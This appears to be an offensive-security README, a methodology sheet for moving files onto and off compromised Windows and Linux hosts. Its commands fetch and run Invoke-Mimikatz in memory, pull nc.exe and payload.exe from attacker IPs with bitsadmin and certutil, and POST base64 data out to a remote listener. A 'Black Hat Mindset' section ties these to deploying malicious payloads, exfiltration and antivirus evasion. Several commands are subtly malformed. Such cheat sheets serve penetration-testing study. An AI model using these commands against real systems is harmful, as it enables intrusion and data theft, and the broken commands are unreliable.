# Basic Methodology - File Transfer (Windows & Linux)

This README explores techniques for transferring files between Windows and Linux systems, leveraging tools like PowerShell, bitsadmin, certutil, wget, curl, php, and scp.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [File Downloads](#file-downloads)
  - [PowerShell Downloads](#powershell-downloads)
  - [Bitsadmin Downloads](#bitsadmin-downloads)
  - [Certutil Downloads](#certutil-downloads)
  - [Wget Downloads](#wget-downloads)
  - [cURL Downloads](#curl-downloads)
  - [PHP Downloads](#php-downloads)
- [File Uploads](#file-uploads)
  - [PowerShell Uploads](#powershell-uploads)
  - [SCP Uploads](#scp-uploads)
- [Advanced Techniques](#advanced-techniques)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

File transfer between Windows and Linux systems is critical for deploying payloads, extracting data, and maintaining persistence during an attack. This guide covers downloading files to both platforms and uploading files from Windows to Linux, using native and stealthy methods.

## Setup and Prerequisites

- **Environment**: Windows host for PowerShell, bitsadmin, and certutil; Linux host for wget, curl, php, and scp.
- **Tools**: Ensure PowerShell is enabled on Windows; install bitsadmin, certutil (native to Windows), wget, curl, php, and openssh-client (for scp) on Linux.
- **Network**: Identify accessible IPs and ports (e.g., 10.10.10.32, 192.168.49.89).
- **Permissions**: Administrative privileges may be required for some commands (e.g., bitsadmin).

## File Downloads

### PowerShell Downloads

Download files using PowerShell commands.

```powershell
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```

### Bitsadmin Downloads

Download files using the Background Intelligent Transfer Service.

```cmd
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

### Certutil Downloads

Download files using the Windows certificate utility.

```cmd
certutil.exe -f http://192.168.49.89:80/payload.exe payload.exe
```

### Wget Downloads

Download files using wget on Linux.

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

### cURL Downloads

Download files using curl on Linux.

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### PHP Downloads

Download files using PHP on Linux.

```php
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

## File Uploads

### PowerShell Uploads

Upload files using PowerShell.

```powershell
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```

### SCP Uploads

Transfer files securely using SCP.

```bash
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

## Advanced Techniques

- **Stealth**: Use user agents (e.g., Chrome) with Invoke-WebRequest or in-memory execution with IEX to avoid detection.
- **Server Setup**: On the receiving end, use `python3 -m http.server 80` (Linux) or a web server to host files for download.

## Black Hat Mindset

- **Deploy Payloads**: Use bitsadmin, certutil, or wget to deliver malicious files to targets.
- **Exfiltrate Data**: Leverage scp or Invoke-WebRequest to extract sensitive files.
- **Bypass Defenses**: Execute files in memory with PowerShell to evade antivirus.
- **Stay Silent**: Use native tools and obscure ports to blend with legitimate traffic.

## Resources

- PowerShell Documentation
- Bitsadmin Overview
- Certutil Documentation
- Wget Manual
- cURL Manual
- SCP Manual

